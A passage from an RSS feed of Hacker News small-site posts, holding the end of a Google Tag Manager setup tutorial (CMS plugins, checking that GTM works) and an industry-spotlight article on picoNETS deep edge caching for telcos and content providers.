src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCI+PGc+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIyNCIgd2lkdGg9IjI0Ii8+PC9nPjxnPjxnPjxnPjxwYXRoIGQ9Ik05LDIxYzAsMC41NSwwLjQ1LDEsMSwxaDRjMC41NSwwLDEtMC40NSwxLTF2LTFIOVYyMXogTTEyLDJDOC4xNCwyLDUsNS4xNCw1LDljMCwyLjM4LDEuMTksNC40NywzLDUuNzRWMTcgYzAsMC41NSwwLjQ1LDEsMSwxaDZjMC41NSwwLDEtMC40NSwxLTF2LTIuMjZjMS44MS0xLjI3LDMtMy4zNiwzLTUuNzRDMTksNS4xNCwxNS44NiwyLDEyLDJ6IE0xNCwxMy43VjE2aC00di0yLjMgQzguNDgsMTIuNjMsNywxMS41Myw3LDljMC0yLjc2LDIuMjQtNSw1LTVzNSwyLjI0LDUsNUMxNywxMS40OSwxNS40OSwxMi42NSwxNCwxMy43eiIvPjwvZz48L2c+PC9nPjwvc3ZnPg==" alt="tip" height="42px"><p><b>If your CMS also offers you a plugin to install other tags</b></p><div><p>Don't use yet another plugin to install Google Analytics, Facebook or Google Ads.</p><p>Instead, <b>use GTM to install those tags</b>.</p><br><ol><li>It will result in a faster page load speed</li><li>It gives you more options to configure the tag</li></ol></div><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>The GTM user interface also receives updates with new features regularly, so you are almost always better off implementing other marketing tags directly with it than with another integration.</p><p>Plus, the gains in load time are good for your bounce rate and help SEO.</p><h3 id="use-a-plugin-to-implement-gtm"><a href="#use-a-plugin-to-implement-gtm" aria-label="Use a plugin to implement GTM" title="Right click to copy link to paragraph"></a>Use a plugin to implement GTM</h3><p>Below a list of the most common content management systems and their plugins to install Google Tag Manager.</p><h4 id="wordpress"><a href="#wordpress" aria-label="WordPress" title="Right click to copy link to paragraph"></a>WordPress</h4><p>There are two WordPress plugins to implement GTM that I would use. <b>First</b>, there is the classic option called <a rel="noopener" target="_blank" href="https://wordpress.org/plugins/duracelltomi-google-tag-manager/">Google Tag Manager for WordPress</a>.<br>The <b>second</b> option is <a rel="noopener" target="_blank" href="https://wordpress.org/plugins/google-site-kit/">Site Kit by Google</a>. It primarily allows you to add a dashboard to your Worpress backend showing information from your Google Analytics account and Google Search Console data - which is pretty sweet. And it also allows you to install GTM.</p><h4 id="shopify"><a href="#shopify" aria-label="Shopify" title="Right click to copy link to paragraph"></a>Shopify</h4><p>For Shopify, there is a <b>free</b> plugin for GTM installation creatively called <em><a rel="noopener" target="_blank" href="https://apps.shopify.com/trafficguard?surface_detail=google+tag+manager&amp;surface_inter_position=1&amp;surface_intra_position=6&amp;surface_type=search">Google Tag Manager Installer</a></em>.</p><h4 id="squarespace"><a href="#squarespace" aria-label="Squarespace" title="Right click to copy link to paragraph"></a>Squarespace</h4><p>For Squarespace, there is no GTM extension or plugin. But you can add the GTM tag manually, by visiting <b>sidebar</b> &gt; <b>settings</b> &gt; <b>advanced</b> &gt; <b>code injection</b>.</p><figure><div></div><figcaption>In Squarespace you can implement GTM under Settings &gt; Advanced &gt; Code Injection</figcaption></figure><p>Next, you paste the GTM tag into the form fields like this:</p><figure><div></div><figcaption>Put the first part of the GTM code in the header field. The Second part goes into the footer field.</figcaption></figure><h4 id="wix"><a href="#wix" aria-label="Wix" title="Right click to copy link to paragraph"></a>Wix</h4><p>Visit the main menu for your Wix website on the left sidebar. From there visit <b>Marketing &amp; SEO</b> and then click on <b>Marketing Integrations</b> further down in the sidebar.<br>Then you will find multiple Wix integrations for Google Analytics, the Facebook pixel and also one Wix extension to implement Google Tag Manager.</p><figure><div></div><figcaption>In Wix use the marketing integration for Google Tag Manager.</figcaption></figure><p>Click on connect and get Google Tag Manager installed.</p><h2 id="how-to-check-if-gtm-is-working"><a href="#how-to-check-if-gtm-is-working" aria-label="How to check if GTM is working?" title="Right click to copy link to paragraph"></a>How to check if GTM is working?</h2><a href="https://twitter.com/intent/tweet?text=When%20you%20first%20log%20in%20to%20GTM...Go%20to%20the%20submit%20button%20and%20publish%20an%20empty%20container.%20Otherwise,%20once%20you%20test%20if%20GTM%20works,%20the%20script%20will%20return%20a%20400%20response%20error%20and%20you%20will%20spend%20hours%20debugging%20why.%20%F0%9F%98%AD%20-%20via%20undefined" target="_blank"><section type="info"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDI0IDI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCI+PGc+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIyNCIgd2lkdGg9IjI0Ii8+PC9nPjxnPjxnPjxnPjxwYXRoIGQ9Ik05LDIxYzAsMC41NSwwLjQ1LDEsMSwxaDRjMC41NSwwLDEtMC40NSwxLTF2LTFIOVYyMXogTTEyLDJDOC4xNCwyLDUsNS4xNCw1LDljMCwyLjM4LDEuMTksNC40NywzLDUuNzRWMTcgYzAsMC41NSwwLjQ1LDEsMSwxaDZjMC41NSwwLDEtMC40NSwxLTF2LTIuMjZjMS44MS0xLjI3LDMtMy4zNiwzLTUuNzRDMTksNS4xNCwxNS44NiwyLDEyLDJ6IE0xNCwxMy43VjE2aC00di0yLjMgQzguNDgsMTIuNjMsNywxMS41Myw3LDljMC0yLjc2LDIuMjQtNSw1LTVzNSwyLjI0LDUsNUMxNywxMS40OSwxNS40OSwxMi42NSwxNCwxMy43eiIvPjwvZz48L2c+PC9nPjwvc3ZnPg==" alt="tip" height="42px"><p><b>When you first log in to GTM</b></p><div><p>Go to the submit button and publish an <b>empty container</b>.</p><div><p>Otherwise, once you test if GTM works, the script will return a <b>400 response error</b> and you will spend hours debugging why. 😭 </p><p>It's a classic 😉</p></div></div><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>After you implemented the GTM script and <b>published a container</b> version (important), you can test if Google Tag Manager is working by doing any of these checks:</p><ol><li><h3 id="preview-and-debug-mode"><a href="#preview-and-debug-mode" aria-label="Preview and debug mode" title="Right click to copy link to paragraph"></a>Preview and debug mode</h3>Log into your GTM account and click on <b>preview</b>. Then, open a new tab in the browser and visit your website. The GTM debugger window should pop open on the bottom of the window if GTM works correctly.<br><figure><div></div><figcaption>Activate the GTM debugger mode to check if GTM is working correctly.</figcaption></figure></li><li><h3 id="chrome-developer-tools"><a href="#chrome-developer-tools" aria-label="Chrome Developer Tools" title="Right click to copy link to paragraph"></a>Chrome Developer Tools</h3><b>Open Chrome Developer Tools</b> with a right-click on any page of your site and select <em>inspect</em> (Alternatively F12 on Windows and Shift+CTRL+J on Mac).<br>Then you go to the <b>network</b> tab and <b>simultaneously reload the web page</b> (F5 on Windows and CMD+Shift+R on Mac). The network tab will fill with all network requests necessary to load the page.<br>In the filter field in the top-left, type <em>gtm.js</em> to find the request for your JavaScript code and verify it has a <b>status code of 200</b>.<p>Let me show you:</p><video loading="lazy" title="Check if Google Tag Manager is working" loop="" controls=""><source src="https://bluerivermountains.com/video/check-if-gtm-is-working.mp4" type="video/mp4"></video><br><b>If you don’t have a 200 status code, maybe you forgot to submit and publish a container first in GTM?</b></li><li><h3 id="google-tag-assistant"><a href="#google-tag-assistant" aria-label="Google Tag Assistant" title="Right click to copy link to paragraph"></a>Google Tag Assistant</h3>Install the <a rel="noopener" target="_blank" href="https://chrome.google.com/webstore/detail/tag-assistant-by-google/kejbdjndbnbjgmefkgdddjlbokphdefk">Google Tag Assistant</a> Chrome extension and start it on your site. It should call out a GTM container ID.<br><div width="452px"><figure><div></div><figcaption>You can also use the Chrome Extension Google Tag Assistant to ensure Google Tag Manager is working correctly.</figcaption></figure></div></li></ol><h2 id="how-to-set-up-google-tag-manager"><a href="#how-to-set-up-google-tag-manager" aria-label="How to set up Google Tag Manager?" title="Right click to copy link to paragraph"></a>How to set up Google Tag Manager?</h2><p>When setting up Google Tag Manager you can make many advanced configurations. So <b><em>how</em></b> you set up GTM, depends on what other tools you plan to use in your <a href="https://bluerivermountains.com/en/tag-management">tag management system</a>.</p><p>That's why I brought together all relevant tutorials that cover whatever you could possibly want to set up in your GTM account - with examples. Simply follow this Google Tag&nbsp;Manager guide and thereby create a solid tag management foundation for your site.</p><p>Only the tutorial on implementing a data layer requires coding skills or potentially web developers.</p><p><b>Note</b>: In this Google Tag Manager tutorial, we will use GTM by <b>manually</b> setting up new tags and triggers for each event. The approach is not super scalable, but it is fast enough and easy, while meeting most tracking ambitions and still being applicable to other advanced setups.</p><p>Larger websites and e-commerce stores require a <b>scalable tag management solution</b>. Therefore a <a href="https://bluerivermountains.com/en/datalayer">data layer</a> is implemented as the central piece to track events. With such a setup, you can use event handlers instead of setting up tags, triggers and variables for each event.</p><ol><li><h3 id="set-up-google-analytics-tracking"><a href="#set-up-google-analytics-tracking" aria-label="Set up Google Analytics tracking" title="Right click to copy link to paragraph"></a>Set up Google Analytics tracking</h3><p>This is the first step for everybody. Learn in this guide how to implement solid Google Analytics tracking, with Goals, Funnels, and your own visits excluded from the traffic. Plus more best practices.</p><a href="https://bluerivermountains.com/en/google-analytics-setup"></a></li><li><h3 id="set-up-event-tracking"><a href="#set-up-event-tracking" aria-label="Set up event tracking" title="Right click to copy link to paragraph"></a>Set up event tracking</h3><p>Once the fundamental tracking implementation is running as it should, you will also want to learn tracking user engagement. How often, for example, does a visitor send form submissions and click on a submit button or another HTML element? My <a href="https://bluerivermountains.com/en/event-tracking">event tracking</a> guide explains exactly that for a <b>button click</b> and you can use the same method for any other click tracking.</p><a href="https://bluerivermountains.com/en/event-tracking"></a></li><li><p>The most common use-case for GTM <em>after</em> installing GA is adding remarketing tags to a website. After all, they make the majority of 3rd-party marketing tags and tracking codes that …</p></li></ol></div></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bluerivermountains.com/en/google-tag-manager-setup">https://bluerivermountains.com/en/google-tag-manager-setup</a></em></p>]]>
            </description>
            <link>https://bluerivermountains.com/en/google-tag-manager-setup</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941974</guid>
            <pubDate>Fri, 30 Oct 2020 13:29:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Edge Caching and Computing by PicoNETS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941965">thread link</a>) | @ponderingfish
<br/>
October 30, 2020 | https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/ | <a href="https://web.archive.org/web/*/https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/piconets-deep-edge-caching-featured-images.png?resize=678%2C381&amp;ssl=1" alt="piconets-deep-edge-caching-featured-images" title="piconets-deep-edge-caching-featured-images" data-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/piconets-deep-edge-caching-featured-images.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p>In this edition of the <a href="https://ottverse.com/category/industry-spotlight/">Industry Spotlight</a> series, we take a look at <a href="https://www.piconets.com/" target="_blank" rel="noopener">picoNETS</a>; a startup focused on building Deep Edge Content Delivery Networks or Deep Edge Caching for Telcos and Content Providers.</p>



<p>Let’s take a look at their product, journey, USP, and what sets them apart from the rest, shall we?</p>




<h2><span id="Who_is_picoNETS"></span>Who is picoNETS?<span></span></h2>



<p>picoNETS is a&nbsp;<strong>Deep Edge Content Delivery Network</strong>&nbsp;provider started in 2016, and they primarily work with telecom and content providers. Some of their USPs and accomplishments are –</p>



<ul><li>They are a Deep Edge CDN for media delivery and also provide edge computing resources.</li><li>picoNETS is a partner of the&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://ruralcloud.com/">Rural Cloud Initiative</a>&nbsp;in the US and is engaged with top OTT platforms in India</li><li>They are live in 5G Labs for a US Telco and have gained traction with Carriers, Telcos, and ISPs in the US, UK, India, Singapore, South Korea, Vietnam, Indonesia, Bangladesh, and Fiji.</li></ul>



<h2><span id="How_does_picoNETS%E2%80%99_Edge_Caching_Work"></span>How does picoNETS’ Edge Caching Work?<span></span></h2>



<p>Before we dive into the “how,” let’s understand why there is a need for a&nbsp;<strong>deep edge CDN</strong>&nbsp;like the one offered by picoNETS.</p>



<p>Let’s take the example of rural America. </p>



<p>A recent article from&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://www.theverge.com/21504476/online-school-covid-pandemic-rural-low-income-internet-broadband">The Verge</a>&nbsp;highlighted the struggle faced by rural Americans in their pursuit of high speed Internet and how this problem was exacerbated in the face of the COVID-19 pandemic. A&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://www.reddit.com/r/technology/comments/j6wor7/americas_internet_wasnt_prepared_for_online/">raging debate on the same article in Reddit</a>&nbsp;underscored the struggle of everyday, rural America.</p>



<p>In addition to a lack of high-speed internet, if a CDN provider does not have a point of presence (PoP) near your city/town/village, then you are going to face problems with streaming video. </p>



<p>Video streaming problems manifest in different ways – a long delay in showing the first picture (startup delay or latency), buffering issues during playback, or while seeking back or forth in the video, and in the worst case, complete stalls or fatal errors. Apart from these problems, a low-bandwidth connection is quite likely to result in a low resolution (or bitrate) video being delivered to your device.</p>



<p>All of these problems amount to an abysmal viewing experience, right?</p>



<p>So what’s the solution to these problems?</p>



<p>Well, one could argue that it’s up to the CDN provider to establish more POPs (geographically distributed) and improve their coverage. While this is a reasonable argument, it can be challenging in terms of infrastructural costs and the RoI for the CDN provider.</p>



<p>However, if you continue this train of thought, you end up with a business model that establishes POPs at a much more granular level.</p>



<p>What do I mean by this?</p>



<p>Well, instead of establishing a POP in every town or city, why not go deeper and install a POP at every airport, shopping mall, school, university, or post office?</p>



<p>Is it possible? Well, it sure is and <strong>this is the USP of picoNETS.</strong></p>



<p>picoNETS go “deep” and establish “deep edge caches” right next to your underserved target audience to ensure that they get a fantastic QoE.</p>



<p>A prototypical customer of picoNETS could be a university that uses the deep edge cache to provide buffer-free, high quality, online classes for their students (live or on-demand).</p>



<p>Here is an illustration of the concept we just discussed. </p>



<figure><img data-attachment-id="1128" data-permalink="https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/piconets/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?fit=960%2C540&amp;ssl=1" data-orig-size="960,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="picoNETS" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?fit=960%2C540&amp;ssl=1" loading="lazy" width="960" height="540" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" alt="picoNETS edge caching" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?w=960&amp;ssl=1 960w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=678%2C381&amp;ssl=1 678w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/picoNETS.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h2><span id="The_benefit_of_using_picoNETS"></span>The benefit of using picoNETS<span></span></h2>



<p>Now that we’ve established that picoNETS brings caching closer to your customer (the “why” and the “how”), the benefits are evident and critical to a good user experience. </p>



<p>With picoNETS, you get,</p>



<ul><li><strong>low latency media delivery</strong>&nbsp;– this is important in reducing stalls, and time-to-first-byte, startup-delay</li><li><strong>reduced buffering</strong>&nbsp;during playback and during seeks.</li><li>the ability to <strong>scale and deliver media</strong> when content goes viral especially, in a geo-localized manner. </li></ul>



<p>Another cool use-case for picoNETS is in the online multiplayer gaming industry. </p>



<p>It is important for gaming engines to synchronize each player’s location with the rest of the players, or else the game-play is spoiled, and there could be unfair advantages to certain players over others.</p>



<p>picoNETS tries to solve such problems by&nbsp;<strong>providing edge-computing</strong>&nbsp;in addition to their edge caching capabilities. By moving the decision and synchronization engines closer to the players (edge, i.e.), game-play is improved, and the latency incurred in player-synchronization is reduced.</p>



<p>All this sounds nice, right? But, my mind went straight to a commercial deployment scenario and I wasn’t sure how picoNETS would work alongside a traditional CDN. Do you need to use both or either one?</p>



<p>Well, let’s find out. </p>



<h2><span id="How_Do_You_Choose_Between_a_CDN_and_picoNETS_Deep_Edge_Cache"></span>How Do You Choose Between a CDN and picoNETS Deep Edge Cache?<span></span></h2>



<p>While speaking to&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://www.linkedin.com/in/ashishrbedekar">Ashish Bedekar</a>, picoNETS’ COO, I asked him what a typical deployment looks like and how does it impact their customers’ operations?</p>



<p>He mentioned that the deployment is quite straightforward (similar to other CDN deployments). And, the decision to switch between a customers’ incumbent, traditional CDN and picoNETS happens at the CMS level.</p>



<p>At the CMS, a decision is taken to playback a stream using the CDN or with the picoNETS Deep Edge Cache. The decision is based on the ASN value, and Ashish told me that the rules could be more fine-grained as needed.</p>



<p>For example, their multi-CDN router allows you to add rules to direct premium subscribers’ traffic vs. others. Also, they have fail-over policies to ensure that the end-user is never left hanging!</p>



<p>This multi-CDN approach is smart and allows you to fine-tune your deployment to take advantage of each service (CDN &amp; picoNETS) in its “area of strength”.</p>



<p>Here’s an example of their architecture that demonstrates this. </p>



<figure><img data-attachment-id="1090" data-permalink="https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/image-2/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?fit=1202%2C706&amp;ssl=1" data-orig-size="1202,706" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?fit=1024%2C601&amp;ssl=1" loading="lazy" width="1024" height="601" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1024%2C601&amp;is-pending-load=1#038;ssl=1" alt="picoNETS edge cache" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1024%2C601&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=300%2C176&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=768%2C451&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1200%2C705&amp;ssl=1 1200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?w=1202&amp;ssl=1 1202w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/image-2.png?resize=1024%2C601&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Again, it’s best to get in touch with picoNETS to discuss specifics.</p>



<h2><span id="Get_in_touch_with_picoNETS"></span>Get in touch with picoNETS<span></span></h2>



<p>To learn more about their technology and to talk to the picoNETS team for further information, you can either <a href="https://www.piconets.com/" target="_blank" rel="noopener">visit their website</a> or <a href="mailto:ashish.bedekar@piconets.com">email Ashish Bedekar</a>.</p>



<h2><span id="Conclusion"></span>Conclusion<span></span></h2>



<p>It is critical to get your content delivery strategy on point when it comes to OTT and I think there is a lot of scope for improving the current techniques used in CDNs, Edge Caching, P2P, etc. with the ultimate goal of providing a sublime viewing experience for the end-users.</p>



<p>I think the work that picoNETS is doing is great, serves a very underserved segment of our population, and helps them enjoy the same benefits as those in urban areas!</p>



<p>Do share this article with your friends on LinkedIn, Twitter, and Facebook. Until next time, take care, <a href="https://ottverse.com/subscribe/">Subscribe</a>, and continue reading OTTVerse.com! </p>

	</div></div>]]>
            </description>
            <link>https://ottverse.com/piconets-deep-edge-caching-at-massive-scale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941965</guid>
